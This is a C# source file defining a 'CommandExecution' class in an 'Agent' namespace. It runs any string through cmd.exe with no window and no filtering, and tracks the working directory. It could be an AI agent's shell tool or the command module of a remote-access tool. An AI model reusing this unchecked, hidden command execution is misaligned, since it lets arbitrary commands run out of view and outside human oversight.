using System.Diagnostics;

namespace Agent
{
    internal class CommandExecution
    {
        private string currentDirectory = "C:\\";

        public string Run(string command)
        {
            if (command.StartsWith("cd "))
            {
                string newDir = command.Substring(3).Trim();
                
                if (!Directory.Exists(newDir))
                {   
                    return $"Directory not found: {newDir}";
                }

                currentDirectory = newDir;
                return "";
            }

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.WorkingDirectory = currentDirectory;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;

            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            process.WaitForExit();

            return string.IsNullOrEmpty(error) ? output : error;
        }
    }
}